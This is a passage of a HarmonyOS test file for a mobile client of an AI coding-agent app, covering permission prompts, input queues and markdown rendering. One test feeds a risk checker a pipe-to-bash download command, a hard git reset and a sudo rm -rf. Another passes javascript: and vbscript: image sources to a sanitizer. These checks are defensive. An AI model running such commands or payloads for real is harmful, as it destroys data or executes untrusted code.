      expect(store.count()).assertEqual(2);
      expect(JSON.stringify(store.selectedIdsInOrder(['message-1', 'message-2'])))
        .assertEqual(JSON.stringify(['message-1', 'message-2']));

      store.enter('session-b');
      expect(store.activeSessionId()).assertEqual('session-b');
      expect(store.count()).assertEqual(0);
    });

    it('reconcilesMissingMessagesAndNotifiesOnlyOnChanges', 0, () => {
      const store = new ShareSelectionStore();
      let notifications = 0;
      store.onChanged(() => notifications += 1);
      store.enter('session-a');
      store.setSelection(['message-1', 'message-2']);
      const afterSelection = notifications;
      store.setSelection(['message-2', 'message-1']);
      expect(notifications).assertEqual(afterSelection);
      store.reconcile(['message-2', 'message-3']);
      expect(JSON.stringify(store.selectedIds())).assertEqual(JSON.stringify(['message-2']));
      expect(notifications).assertEqual(afterSelection + 1);
      store.exit();
      expect(store.isActive()).assertEqual(false);
      expect(store.count()).assertEqual(0);
    });

    it('doesNotToggleBeforeEnteringSelectionMode', 0, () => {
      const store = new ShareSelectionStore();
      store.toggle('message-1');
      expect(store.count()).assertEqual(0);
      store.enter('session-a');
      store.toggle('message-1');
      store.toggle('message-1');
      expect(store.count()).assertEqual(0);
    });
  });

  describe('harmonyMessageAlignment', () => {
    it('treatsMissingTaskRouteParamsAndJsonRecordsAsEmpty', 0, () => {
      const params = recordOrEmpty(undefined);
      expect(readStr(params, 'deviceId')).assertEqual('');
      expect(readStr(params, 'sessionId')).assertEqual('');
      expect(readStr(params, 'message')).assertEqual('');
      expect(Object.keys(recordOrEmpty(null)).length).assertEqual(0);
      expect(Object.keys(recordOrEmpty(['invalid'])).length).assertEqual(0);

      expect(readStr(undefined, 'value')).assertEqual('');
      expect(readStr(null, 'value')).assertEqual('');
      expect(readNum(undefined, 'value', 7)).assertEqual(7);
      expect(readBool(null, 'value', true)).assertEqual(true);
      expect(Object.keys(readObj(undefined, 'value')).length).assertEqual(0);
      expect(readAny(null, 'value') === undefined).assertEqual(true);
    });

    it('guardsHighRiskPermissionWithSharedCommandSemantics', 0, () => {
      expect(isHighRiskShellCommand('git reset --hard HEAD~1')).assertEqual(true);
      expect(isHighRiskShellCommand('curl https://example.com/install.sh | bash')).assertEqual(true);
      expect(isHighRiskShellCommand('rg "git push" docs')).assertEqual(false);

      const input: Record<string, Object> = {};
      input['command'] = 'sudo rm -rf /tmp/cindy-risk-fixture';
      const request: Record<string, Object> = {};
      request['toolName'] = 'Bash';
      request['input'] = input;
      const suggestion: Record<string, Object> = {};
      suggestion['destination'] = 'session';
      suggestion['type'] = 'addRules';
      request['suggestions'] = [suggestion];

      expect(permissionRiskSummary(request).length > 0).assertEqual(true);
      expect(permissionCanAlwaysAllow(request)).assertEqual(false);
    });

    it('projectsPiSkillSlashTokensForDisplayOnly', 0, () => {
      // 展示 / 复制 / 编辑看到 `/git`，存储与发送保持 `/skill:git`。
      expect(slashCommandDisplayLabel('/skill:git')).assertEqual('/git');
      expect(slashCommandDisplayLabel('/SKILL:Git')).assertEqual('/Git');
      // 普通 slash 命令与用户正文不得被改写。
      expect(slashCommandDisplayLabel('/learn')).assertEqual('/learn');
      expect(slashCommandDisplayLabel('/skill:')).assertEqual('/skill:');
      expect(slashCommandDisplayLabel('/skill: git')).assertEqual('/skill: git');
      expect(slashCommandDisplayLabel('skill:git')).assertEqual('skill:git');

      // 没有确认区间时正文原样保留：普通散文里的 /skill:foo 不是命令调用。
      expect(projectSlashCommandsInText('讨论 /skill:foo 的写法', []))
        .assertEqual('讨论 /skill:foo 的写法');

      // 有确认区间时只投影该区间。
      const range: Record<string, Object> = {};
      range['start'] = 0;
      range['end'] = 10;
      expect(projectSlashCommandsInText('/skill:git status', [range]))
        .assertEqual('/git status');

      // 多区间从后往前替换，前面的下标不被长度变化破坏。
      const first: Record<string, Object> = {};
      first['start'] = 0;
      first['end'] = 10;
      const second: Record<string, Object> = {};
      second['start'] = 11;
      second['end'] = 22;
      expect(projectSlashCommandsInText('/skill:git\n/skill:test', [first, second]))
        .assertEqual('/git\n/test');

      // 越界与非法区间安全跳过，不抛异常也不截断正文。
      const bad: Record<string, Object> = {};
      bad['start'] = 5;
      bad['end'] = 999;
      expect(projectSlashCommandsInText('/skill:git', [bad])).assertEqual('/skill:git');
    });

    it('localizesAutoReviewUnavailablePermissionCardsOnly', 0, () => {
      // metadata.autoReviewUnavailable 标记的 permission 卡是 Auto-review 故障降级；
      // 普通 permission、缺标记和其他 kind 都不得出现这句提示。
      const degraded: Record<string, Object> = {};
      degraded['kind'] = 'permission';
      degraded['toolName'] = 'Bash';
      const metadata: Record<string, Object> = {};
      metadata['autoReviewUnavailable'] = true;
      degraded['metadata'] = metadata;
      expect(permissionAutoReviewUnavailableNotice(degraded))
        .assertEqual('自动审批没完成，请确认要不要允许这次操作。');

      const ordinary: Record<string, Object> = {};
      ordinary['kind'] = 'permission';
      ordinary['toolName'] = 'Bash';
      expect(permissionAutoReviewUnavailableNotice(ordinary)).assertEqual('');

      // 非 true 的真值不算标记（对齐共享实现的 === true）。
      const looseMetadata: Record<string, Object> = {};
      looseMetadata['autoReviewUnavailable'] = 'yes';
      const loose: Record<string, Object> = {};
      loose['kind'] = 'permission';
      loose['metadata'] = looseMetadata;
      expect(permissionAutoReviewUnavailableNotice(loose)).assertEqual('');

      // Ask User 带同名标记也不显示：这句只解释权限确认卡的来路。
      const ask: Record<string, Object> = {};
      ask['kind'] = 'ask_user_question';
      ask['metadata'] = metadata;
      expect(permissionAutoReviewUnavailableNotice(ask)).assertEqual('');
    });

    it('usesSessionScopedPermissionSuggestionsAndDecisionSchema', 0, () => {      const sessionSuggestion: Record<string, Object> = {};
      sessionSuggestion['destination'] = 'session';
      sessionSuggestion['type'] = 'addRules';
      const userSuggestion: Record<string, Object> = {};
      userSuggestion['destination'] = 'user';
      const request: Record<string, Object> = {};
      request['toolName'] = 'Read';
      request['suggestions'] = [sessionSuggestion, userSuggestion];

      expect(sessionScopedPermissionSuggestions(request).length).assertEqual(1);
      expect(permissionCanAlwaysAllow(request)).assertEqual(true);
      const decision = buildPermissionDecision(request, 'always-allow');
      expect(decision['behavior']).assertEqual('allow');
      expect((decision['permissionUpdates'] as Object[]).length).assertEqual(1);
    });

    it('keepsInteractionPriorityAskDescriptionsAndPlanEvidence', 0, () => {
      const question: Record<string, Object> = {};
      const option: Record<string, Object> = {};
      option['label'] = '保守方案';
      option['description'] = '改动更小，风险更低';
      question['options'] = [option];
      const options = askOptionPresentations(question);
      expect(options.length).assertEqual(1);
      expect(options[0].description).assertEqual('改动更小，风险更低');

      const ask = new PendingInteraction();
      ask.requestId = 'ask';
      ask.kind = 'ask_user_question';
      const permission = new PendingInteraction();
      permission.requestId = 'permission';
      permission.kind = 'permission';
      const plan = new PendingInteraction();
      plan.requestId = 'plan';
      plan.kind = 'plan_review';
      const sorted = sortPendingInteractions([ask, permission, plan]);
      expect(sorted[0].requestId).assertEqual('plan');
      expect(sorted[1].requestId).assertEqual('permission');
      expect(sorted[2].requestId).assertEqual('ask');
      expect(interactionKindLabel('rename_sessions_confirm')).assertEqual('重命名');
      expect(interactionKindLabel('ghost_grant_confirm')).assertEqual('文件访问');
      expect(interactionPriority('rename_sessions_confirm')).assertEqual(3);
      expect(interactionPriority('ghost_grant_confirm')).assertEqual(3);

      const evidence = buildPlanReviewEvidence([
        '# 总览',
        '```md',
        '## 围栏内忽略',
        '```',
        '## 实现',
        '### 验证',
        '# 交付',
      ].join('\n'), '/repo/docs/plan.md', 3);
      expect(evidence.fileName).assertEqual('plan.md');
      expect(evidence.outlineTotalCount).assertEqual(4);
      expect(evidence.outlineItems.length).assertEqual(3);
      expect(evidence.outlineOverflowCount).assertEqual(1);
      expect(evidence.outlineItems[1].title).assertEqual('实现');
    });

    it('publishesAskDraftSelectionsAsClonedSnapshots', 0, () => {
      const store = new InteractionStore();
      let changed = 0;
      const unsubscribe = store.onChanged(() => {
        changed += 1;
      });
      const draft = new AskUserDraft();
      draft.selectedLabels = ['最近优先'];
      draft.answers.set('请选择排序方式', '最近优先');
      store.saveAskDraft('ask-1', draft);

      expect(changed).assertEqual(1);
      const snapshot = store.readAskDraft('ask-1');
      expect(snapshot !== null).assertEqual(true);
      expect(snapshot?.selectedLabels[0]).assertEqual('最近优先');
      snapshot?.selectedLabels.push('字母排序');
      expect(store.readAskDraft('ask-1')?.selectedLabels.length).assertEqual(1);
      unsubscribe();
    });

    it('keepsPendingInteractionsScopedToTheirSourceDevice', 0, () => {
      const store = new InteractionStore();
      const requestA: Record<string, Object> = {};
      requestA['requestId'] = 'same-request-a';
      requestA['kind'] = 'ask_user_question';
      const payloadA: Record<string, Object> = {};
      payloadA['sessionId'] = 'same-session';
      payloadA['request'] = requestA;
      store.handleInteractionRequest(payloadA, 'desktop-a');

      const requestB: Record<string, Object> = {};
      requestB['requestId'] = 'same-request-b';
      requestB['kind'] = 'permission';
      const payloadB: Record<string, Object> = {};
      payloadB['sessionId'] = 'same-session';
      payloadB['request'] = requestB;
      store.handleInteractionRequest(payloadB, 'desktop-b');

      expect(store.getPending('same-session', 'desktop-a').length).assertEqual(1);
      expect(store.getPending('same-session', 'desktop-a')[0].deviceId).assertEqual('desktop-a');
      expect(store.getPending('same-session', 'desktop-b').length).assertEqual(1);
      expect(store.getPending('same-session').length).assertEqual(0);

      const dismissed: Record<string, Object> = {};
      dismissed['sessionId'] = 'same-session';
      dismissed['requestId'] = 'same-request-a';
      store.handleInteractionDismissed(dismissed, 'desktop-a');
      expect(store.getPending('same-session', 'desktop-a').length).assertEqual(0);
      expect(store.getPending('same-session', 'desktop-b').length).assertEqual(1);
    });

    it('blocksComposerOnlyForLocallyResolvablePendingInteractions', 0, () => {
      const plugin = new PendingInteraction();
      plugin.requestId = 'plugin';
      plugin.kind = 'plugin_setup';
      const issue = new PendingInteraction();
      issue.requestId = 'issue';
      issue.kind = 'issue_confirm';
      const unknown = new PendingInteraction();
      unknown.requestId = 'unknown';
      unknown.kind = 'future_kind';
      const permission = new PendingInteraction();
      permission.requestId = 'permission';
      permission.kind = 'permission';
      const ask = new PendingInteraction();
      ask.requestId = 'ask';
      ask.kind = 'ask_user_question';
      const plan = new PendingInteraction();
      plan.requestId = 'plan';
      plan.kind = 'plan_review';

      expect(pendingInteractionsBlockRemoteComposer([])).assertEqual(false);
      expect(pendingInteractionsBlockRemoteComposer([plugin, issue, unknown])).assertEqual(false);
      expect(pendingInteractionsBlockRemoteComposer([plugin, permission])).assertEqual(true);
      expect(pendingInteractionsBlockRemoteComposer([ask])).assertEqual(true);
      expect(pendingInteractionsBlockRemoteComposer([plan])).assertEqual(true);
    });

    it('classifiesAttachmentRetriesAndKeepsTranscodedMetadataConsistent', 0, () => {
      expect(isRetryablePresignStatus(408)).assertEqual(true);
      expect(isRetryablePresignStatus(429)).assertEqual(true);
      expect(isRetryablePresignStatus(503)).assertEqual(true);
      expect(isRetryablePresignStatus(400)).assertEqual(false);
      expect(isRetryablePresignStatus(404)).assertEqual(false);

      const pngName = renameForImagePreprocess('camera.webp', 'png');
      expect(pngName).assertEqual('camera.png');
      expect(uploadExtForName(pngName)).assertEqual('png');
      expect(renameForImagePreprocess('capture', 'jpeg')).assertEqual('capture.jpg');

      expect(isUploadRevisionCurrent(2, 2, false, true)).assertEqual(true);
      expect(isUploadRevisionCurrent(3, 2, false, true)).assertEqual(false);
      expect(isUploadRevisionCurrent(2, 2, true, true)).assertEqual(false);
      expect(isUploadRevisionCurrent(2, 2, false, false)).assertEqual(false);

      const uploadingKey = composerAttachmentRenderKey('photo://1', 'uploading', 1);
      expect(composerAttachmentRenderKey('photo://1', 'ready', 1) === uploadingKey).assertEqual(false);
      expect(composerAttachmentRenderKey('photo://1', 'failed', 1) === uploadingKey).assertEqual(false);
      expect(composerAttachmentRenderKey('photo://1', 'uploading', 2) === uploadingKey).assertEqual(false);

      const firstLocalId = createComposerAttachmentLocalId();
      const secondLocalId = createComposerAttachmentLocalId();
      expect(firstLocalId.length > 0).assertEqual(true);
      expect(secondLocalId === firstLocalId).assertEqual(false);
      expect(composerAttachmentRenderKey(secondLocalId, 'ready', 1) ===
        composerAttachmentRenderKey(firstLocalId, 'ready', 1)).assertEqual(false);
    });

    it('recognizesSchedulerAutomationOrigin', 0, () => {
      const origin: Record<string, Object> = {};
      origin['kind'] = 'scheduler';
      origin['scheduleId'] = 'schedule-1';
      const agentMeta: Record<string, Object> = {};
      agentMeta['origin'] = origin;
      const raw: Record<string, Object> = {};
      raw['id'] = 'message-1';
      raw['role'] = 'user';
      raw['content'] = 'scheduled prompt';
      raw['agentMeta'] = agentMeta;

      expect(parseMessage(raw).automationOrigin).assertEqual(true);
    });

    it('rejectsIncompleteAutomationOrigin', 0, () => {
      const origin: Record<string, Object> = {};
      origin['kind'] = 'scheduler';
      const agentMeta: Record<string, Object> = {};
      agentMeta['origin'] = origin;
      const raw: Record<string, Object> = {};
      raw['id'] = 'message-2';
      raw['role'] = 'user';
      raw['content'] = 'not a valid scheduler message';
      raw['agentMeta'] = agentMeta;

      expect(parseMessage(raw).automationOrigin).assertEqual(false);
    });

    it('keepsSentTextAndImagesInAgentAndTranscriptShapes', 0, () => {
      const image = new RemoteImageRef();
      image.url = 'cindy-oss-attach://m/test';
      image.originalName = 'screen.png';
      image.mimeType = 'image/png';
      image.size = 42;
      image.sha256 = 'abc';

      const agentContent = buildAgentUserContent('请检查截图', [image]) as Object[];
      const imageBlock = agentContent[1] as Record<string, Object>;
      expect(agentContent.length).assertEqual(2);
      expect(imageBlock['type']).assertEqual('image');
      expect(imageBlock['path']).assertEqual(image.url);

      const persisted = JSON.parse(buildPersistedUserContent('请检查截图', [image])) as Record<string, Object>;
      expect(persisted['text']).assertEqual('请检查截图');
      const persistedImages = persisted['images'] as Object[];
      const persistedImage = persistedImages[0] as Record<string, Object>;
      expect(persistedImage['url']).assertEqual(image.url);
      expect(persistedImage['originalName']).assertEqual('screen.png');
    });

    it('usesMobileLongMessageThresholdsAndLineLimits', 0, () => {
      const fiveLines = 'one\ntwo\nthree\nfour\nfive';
      expect(shouldAutoCollapseUserMessage(fiveLines, true)).assertEqual(true);
      expect(shouldAutoCollapseUserMessage(fiveLines, false)).assertEqual(false);
      expect(collapsedUserMessageLineLimit(true)).assertEqual(3);
      expect(collapsedUserMessageLineLimit(false)).assertEqual(10);
    });

    it('distinguishesSettledToolErrorsFromNormalOutput', 0, () => {
      const failed = new RemoteMessage();
      failed.role = 'tool_result';
      const failedContent: Record<string, Object> = {};
      failedContent['isError'] = true;
      failedContent['text'] = 'request failed';
      failed.content = failedContent;

      const plainFailure = new RemoteMessage();
      plainFailure.role = 'tool_result';
      plainFailure.content = 'Error: connection refused';

      const normal = new RemoteMessage();
      normal.role = 'tool_result';
      normal.content = 'Read docs/error-handling.md successfully';

      expect(toolResultHasError(failed)).assertEqual(true);
      expect(toolResultHasError(plainFailure, 'Bash')).assertEqual(true);
      expect(toolResultHasError(normal)).assertEqual(false);
    });

    it('keepsContentToolErrorsAnchoredAndPreservesFullToolResults', 0, () => {
      const contentMention = new RemoteMessage();
      contentMention.role = 'tool_result';
      contentMention.content = 'docs/error-handling.md\nThis document explains failure recovery.';
      expect(toolResultHasError(contentMention, 'Read')).assertEqual(false);

      const contentFailure = new RemoteMessage();
      contentFailure.role = 'tool_result';
      contentFailure.content = 'Error: ENOENT /repo/missing.txt';
      expect(toolResultHasError(contentFailure, 'Read')).assertEqual(true);

      expect(shouldSplitToolGroup(
        '2026-08-09T00:00:00.000Z', '2026-08-09T00:31:00.000Z')).assertEqual(true);
      expect(shouldSplitToolGroup(
        '2026-08-09T00:00:00.000Z', '2026-08-09T00:29:00.000Z')).assertEqual(false);
    });

    it('parsesSafeMarkdownImagesAndLeavesScriptSchemesAsText', 0, () => {
      const tokens = tokenizeInline('before ![chart](xdt-image://art/chart.png) <img src="cindy-media://blobs/photo.png" alt="photo"> after');
      let imageCount = 0;
      for (let i = 0; i < tokens.length; i++) {
        if (tokens[i].kind === 'image') imageCount += 1;
      }
      expect(imageCount).assertEqual(2);

      const blocked = tokenizeInline('![bad](javascript:alert(1)) and <img src="vbscript:evil">');
      let blockedImageCount = 0;
      for (let i = 0; i < blocked.length; i++) {
        if (blocked[i].kind === 'image') blockedImageCount += 1;
      }
      expect(blockedImageCount).assertEqual(0);
    });

    it('preservesMarkdownFormattingAroundImagesAndTaskLists', 0, () => {
      const tokens = tokenizeInline(
        '**bold** *em* ~~gone~~ $x^2$ ![chart](xdt-image://art/chart.png) `code`');
      expect(tokens[0].kind).assertEqual('strong');
      expect(tokens[2].kind).assertEqual('emphasis');
      expect(tokens[4].kind).assertEqual('strikethrough');
      expect(tokens[6].kind).assertEqual('math');
      expect(tokens[8].kind).assertEqual('image');
      expect(tokens[10].kind).assertEqual('code');
      const groups = groupInlineTokens(tokens);
      expect(groups.length).assertEqual(3);
      expect(groups[0].tokens[0].kind).assertEqual('strong');
      expect(groups[1].image?.kind).assertEqual('image');
      expect(groups[2].tokens[0].kind).assertEqual('text');

      const blocks = parseMarkdown('## **计划** ##\n\n- [x] 已完成\n- [ ] 待处理');
      expect(blocks[0].type).assertEqual('heading');
      expect(blocks[0].text).assertEqual('**计划**');
      expect(blocks[0].inlineTokens[0].kind).assertEqual('strong');
      expect(blocks[1].itemChecked[0]).assertEqual(1);
      expect(blocks[1].itemChecked[1]).assertEqual(0);

      const currency = tokenizeInline('$5 和 $10；`$HOME`');
      let mathCount = 0;
      for (let i = 0; i < currency.length; i++) {
        if (currency[i].kind === 'math') mathCount += 1;
      }
      expect(mathCount).assertEqual(0);
    });

    it('groupsBoundedSelectableMarkdownTextRunsAroundComplexBlocks', 0, () => {
      const blocks = parseMarkdown(
        '# 标题\n\n第一段\n\n- 第一项\n- 第二项\n\n```ts\nconst ready = true;\n```\n\n最后一段');
      const groups = groupMarkdownSelectableBlocks(blocks);
      expect(groups.length).assertEqual(3);
      expect(groups[0].type).assertEqual('text_run');
      expect(groups[0].textBlocks.length).assertEqual(4);
      expect(groups[0].textBlocks[0].type).assertEqual('heading');
      expect(groups[0].textBlocks[2].type).assertEqual('list_item');
      expect(groups[0].textBlocks[3].marker).assertEqual('-');
      expect(groups[1].type).assertEqual('single');
      expect(groups[1].block?.type).assertEqual('code');
      expect(groups[2].type).assertEqual('text_run');
      expect(groups[2].textBlocks[0].inlineTokens[0].value).assertEqual('最后一段');
    });

    it('splitsSelectableMarkdownRunsByBlockAndTextLimits', 0, () => {
      const blocks = parseMarkdown('一二三\n\n四五六\n\n七八九');
      const byBlocks = groupMarkdownSelectableBlocks(blocks, 2, 1800);
      expect(byBlocks.length).assertEqual(2);
      expect(byBlocks[0].textBlocks.length).assertEqual(2);
      expect(byBlocks[1].textBlocks.length).assertEqual(1);

      const byLength = groupMarkdownSelectableBlocks(blocks, 12, 7);
      expect(byLength.length).assertEqual(3);
      expect(byLength[0].textBlocks.length).assertEqual(1);
      expect(byLength[1].textBlocks.length).assertEqual(1);
      expect(byLength[2].textBlocks.length).assertEqual(1);
    });

    it('keepsMarkdownImagesOutsideSelectableTextRuns', 0, () => {
      const blocks = parseMarkdown('前文\n\n图片 ![图](https://example.com/a.png) 后文\n\n尾文');
      const groups = groupMarkdownSelectableBlocks(blocks);
      expect(groups.length).assertEqual(3);
      expect(groups[0].type).assertEqual('text_run');
      expect(groups[1].type).assertEqual('single');
      expect(groups[1].block?.type).assertEqual('paragraph');
      expect(groups[2].type).assertEqual('text_run');
    });

    it('reusesStableMarkdownBlocksWhileStreamingTailGrows', 0, () => {
      const message = new RemoteMessage();
      message.id = 'streaming-markdown-block-reuse';
      message.clientId = message.id;
      message.sessionId = 'streaming-markdown-session';
      message.role = 'assistant';
      message.content = '已经完成的第一段\n\n正在输出';
      message.isStreaming = true;

      const first = buildRenderItems([message], true)[0] as RenderMessageItem;
      const stableBlockSeq = first.mdBlocks[0].seq;
      const growingBlockSeq = first.mdBlocks[1].seq;

      message.content = '已经完成的第一段\n\n正在输出新内容';
      const second = buildRenderItems([message], true)[0] as RenderMessageItem;
      expect(second.mdBlocks[0].seq).assertEqual(stableBlockSeq);
      expect(second.mdBlocks[1].seq === growingBlockSeq).assertEqual(false);
      expect(second.mdBlocks[1].text).assertEqual('正在输出新内容');
    });

    it('parsesOnlyCompactThinkingStrongAndCodeMarkers', 0, () => {
      const tokens = tokenizeThinkingText('**Reviewing** `TaskPage.ets` and ``a ` b``');
      expect(tokens.length).assertEqual(5);
      expect(tokens[0].kind).assertEqual('strong');
      expect(tokens[0].value).assertEqual('Reviewing');
      expect(tokens[1].kind).assertEqual('text');
      expect(tokens[2].kind).assertEqual('code');
      expect(tokens[2].value).assertEqual('TaskPage.ets');
      expect(tokens[4].kind).assertEqual('code');
      expect(tokens[4].value).assertEqual('a ` b');

      const literal = tokenizeThinkingText('\\**escaped** **unclosed `also unclosed');
      expect(literal.length).assertEqual(1);
      expect(literal[0].kind).assertEqual('text');
      expect(literal[0].value).assertEqual('\\**escaped** **unclosed `also unclosed');

      const unsupported = tokenizeThinkingText('*emphasis* [link](https://example.com)');
      expect(unsupported.length).assertEqual(1);
      expect(unsupported[0].kind).assertEqual('text');
    });

    it('searchesNestedWorkAndPreservesTheSelectedHitAcrossPrepend', 0, () => {
      const thinking = new RenderThinkingItem();
      thinking.type = 'thinking';
      thinking.key = 'thinking-leaf';
      thinking.body = 'deep needle';
      const work = new RenderWorkGroupItem();
      work.type = 'work_group';
      work.key = 'work-inner';
      work.children = [thinking];
      const subagent = new RenderSubagentGroupItem();
      subagent.type = 'subagent_group';
      subagent.key = 'subagent-top';
      subagent.children = [work];

      const task = new RenderAgentTaskItem();
      task.type = 'agent_task';
      task.key = 'agent-task-top';
      task.update = new AgentTaskUpdate();
      task.update.taskId = 'task-source';
      task.update.description = 'second needle';

      const firstHits = findMessageSearchHits([subagent, task], 'needle');
      expect(firstHits.length).assertEqual(2);
      expect(firstHits[0].itemKey).assertEqual('subagent-top');
      expect(firstHits[0].sourceKey).assertEqual('thinking-leaf');
      expect(firstHits[1].sourceKey).assertEqual('task-source');

      const prepended = new RenderThinkingItem();
      prepended.type = 'thinking';
      prepended.key = 'older-source';
      prepended.body = 'older needle';
      const afterPrepend = findMessageSearchHits([prepended, subagent, task], 'needle');
      expect(reconcileMessageSearchIndex(
        afterPrepend, 1, firstHits[1].sourceKey)).assertEqual(2);
      expect(nextMessageSearchIndex(afterPrepend.length, 0, -1)).assertEqual(2);

      expect(messageSearchPagingPresentation('needle', true, false, 0).label)
        .assertEqual('加载更早继续搜索');
      expect(messageSearchPagingPresentation('needle', true, true, 1).enabled)
        .assertEqual(false);
    });

    it('tracksProjectionCapabilityAndAuthorityFences', 0, () => {
      expect(parseInputProjection(undefined, 's1').continuationInFlightProjectionCapability)
        .assertEqual('unknown');
      const legacy: Record<string, Object> = {};
      legacy['sessionId'] = 's1';
      expect(parseInputProjection(legacy, 's1').continuationInFlightProjectionCapability)
        .assertEqual('legacy');
      const supported: Record<string, Object> = {};
      supported['sessionId'] = 's1';
      supported['continuationTurnClientId'] = JSON.parse('null') as Object;
      expect(parseInputProjection(supported, 's1').continuationInFlightProjectionCapability)
        .assertEqual('supported');

      const store = new InputQueueStore();
      const beforePush = store.captureAuthorityEpoch('s1');
      const owner: Record<string, Object> = {};
      owner['sessionId'] = 's1';
      owner['continuationTurnClientId'] = 'continuation-1';
      store.handleProjectionPush(owner);
      expect(store.captureAuthorityEpoch('s1') > beforePush).assertEqual(true);
      store.noteTurnTerminal('s1');
      expect(store.getProjection('s1').continuationTurnClientId).assertEqual('');
      store.activateSession('device-1', 's1');
      const beforeClear = store.captureAuthorityEpoch('s1');
      store.clearSession('s1');
      expect(store.captureAuthorityEpoch('s1') > beforeClear).assertEqual(true);
      void store.resyncActiveSessions();
      expect(store.getProjection('s1').pendingQueue.length).assertEqual(0);
      const oldOther = store.captureAuthorityEpoch('other');
      store.clearAll();
      expect(store.captureAuthorityEpoch('other') > oldOther).assertEqual(true);

      const beforeStop = store.captureAuthorityEpoch('stop-session');
      store.stop('device-1', 'stop-session').catch(() => {});
      expect(store.captureAuthorityEpoch('stop-session') > beforeStop).assertEqual(true);
    });

    it('acceptsMobileCompatibleEmptyQueuedInputFields', 0, () => {
      const chat: Record<string, Object> = {};
      chat['role'] = 'user';
      chat['createdAt'] = '2026-08-01T00:00:00.000Z';
      const raw: Record<string, Object> = {};
      raw['clientId'] = 'empty-message';
      raw['text'] = '';
      raw['persistedContent'] = '';
      raw['model'] = '';
      raw['workingDir'] = '';
      const emptyCreateOpts: Record<string, Object> = {};
      raw['createOpts'] = emptyCreateOpts;
      raw['chatMessage'] = chat;
      expect(parseQueuedInputItem(raw) !== null).assertEqual(true);
    });

    it('invalidatesProjectionWhenOwningDeviceBecomesUnavailable', 0, () => {
      const store = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'owned-session';
      session.model = 'model';
      session.permissionMode = 'ask';
      store.seedOptimisticText('device-1', session, 'hello', [], 'stable-client');
      const before = store.captureAuthorityEpoch(session.id);
      expect(store.getProjection(session.id).pendingQueue.length).assertEqual(1);
      store.invalidateDevice('device-1');
      expect(store.getProjection(session.id).pendingQueue.length).assertEqual(0);
      const lateProjection: Record<string, Object> = {};
      lateProjection['sessionId'] = session.id;
      lateProjection['pendingQueue'] = [];
      store.handleProjectionPush(lateProjection, 'device-1');
      expect(store.getProjection(session.id, 'device-1').pendingQueue.length).assertEqual(0);
      expect(store.captureAuthorityEpoch(session.id) > before).assertEqual(true);
    });

    it('rejectsForeignInputProjectionAndTerminalForSameSession', 0, () => {
      const store = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'same-session-queue';
      session.model = 'model';
      session.permissionMode = 'ask';
      store.seedOptimisticText('desktop-a', session, 'from A', [], 'queue-a');

      const ownerProjection: Record<string, Object> = {};
      ownerProjection['sessionId'] = session.id;
      ownerProjection['continuationTurnClientId'] = 'continuation-a';
      ownerProjection['pendingQueue'] = [
        store.getProjection(session.id, 'desktop-a').pendingQueue[0].raw,
      ];
      store.handleProjectionPush(ownerProjection, 'desktop-a');

      const foreignProjection: Record<string, Object> = {};
      foreignProjection['sessionId'] = session.id;
      foreignProjection['continuationTurnClientId'] = '';
      foreignProjection['pendingQueue'] = [];
      store.handleProjectionPush(foreignProjection, 'desktop-b');
      store.noteTurnTerminal(session.id, 'desktop-b');

      const owner = store.getProjection(session.id, 'desktop-a');
      expect(owner.pendingQueue.length).assertEqual(1);
      expect(owner.continuationTurnClientId).assertEqual('continuation-a');
      expect(store.getProjection(session.id, 'desktop-b').pendingQueue.length).assertEqual(0);

      // 页面明确切换到 B 时清掉 A 的投影；之后 B 才能建立自己的队列上下文。
      store.seedOptimisticText('desktop-b', session, 'from B', [], 'queue-b');
      expect(store.getProjection(session.id, 'desktop-a').pendingQueue.length).assertEqual(0);
      expect(store.getProjection(session.id, 'desktop-b').pendingQueue.length).assertEqual(1);
    });

    it('doesNotDuplicateOptimisticFirstMessageWithStableClientId', 0, () => {
      const store = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'optimistic-session';
      session.model = 'model';
      session.permissionMode = 'ask';
      store.seedOptimisticText('device-1', session, 'first', [], 'stable-client');
      store.seedOptimisticText('device-1', session, 'first', [], 'stable-client');
      const queue = store.getProjection(session.id).pendingQueue;
      expect(queue.length).assertEqual(1);
      expect(queue[0].clientId).assertEqual('stable-client');
    });

    it('rebuildsQueueBubblePresentationAfterAckAndRenumbersAfterDrain', 0, () => {
      const store = new InputQueueStore();
      const session = new RemoteSession();
      session.id = 'queue-render-session';
      session.model = 'model';
      session.permissionMode = 'ask';
      store.seedOptimisticText('device-1', session, 'one', [], 'queue-1');
      store.seedOptimisticText('device-1', session, 'two', [], 'queue-2');
      store.seedOptimisticText('device-1', session, 'three', [], 'queue-3');
      const rawQueue = store.getProjection(session.id).pendingQueue
        .map((item) => item.raw as Object);

      const sendingProjection: Record<string, Object> = {};
      sendingProjection['sessionId'] = session.id;
      sendingProjection['pendingQueue'] = rawQueue;
      sendingProjection['steeringQueueClientIds'] = ['queue-1'];
      store.handleProjectionPush(sendingProjection);
      const sendingBubble = store.getBubbles(session.id)[0];
      const sendingKey = pendingQueueBubbleRenderKey(sendingBubble);
      expect(sendingBubble.phase).assertEqual('sending');

      const acknowledgedProjection: Record<string, Object> = {};
      acknowledgedProjection['sessionId'] = session.id;
      acknowledgedProjection['pendingQueue'] = rawQueue;
      acknowledgedProjection['steeringQueueClientIds'] = [];
      store.handleProjectionPush(acknowledgedProjection);
      const queuedBubble = store.getBubbles(session.id)[0];
      expect(queuedBubble.phase).assertEqual('queued');
      expect(pendingQueueBubbleRenderKey(queuedBubble) === sendingKey).assertEqual(false);

      const drainedProjection: Record<string, Object> = {};
      drainedProjection['sessionId'] = session.id;
      drainedProjection['pendingQueue'] = [rawQueue[1], rawQueue[2]];
      store.handleProjectionPush(drainedProjection);
      const afterDrain = store.getBubbles(session.id);
      const second = afterDrain.find((item) => item.clientId === 'queue-2');
      const third = afterDrain.find((item) => item.clientId === 'queue-3');
      expect(second?.queueIndex).assertEqual(1);
      expect(third?.queueIndex).assertEqual(2);
    });

    it('doesNotApplyAsyncComposerDraftAfterUserStartsTyping', 0, () => {
      expect(shouldApplyComposerDraftRead('session-1', 'session-1', 3, 3, 7, 7, false))
        .assertEqual(true);
      expect(shouldApplyComposerDraftRead('session-1', 'session-1', 3, 3, 7, 8, false))
        .assertEqual(false);
      expect(shouldApplyComposerDraftRead('session-1', 'session-2', 3, 3, 7, 7, false))
        .assertEqual(false);
    });

    it('isolatesComposerDraftsByRemoteDeviceAndClaimsLegacyDraftOnce', 0, async () => {
      const storage = new MemorySecureStore();
      const legacyWriter = new ComposerDraftStore(storage);
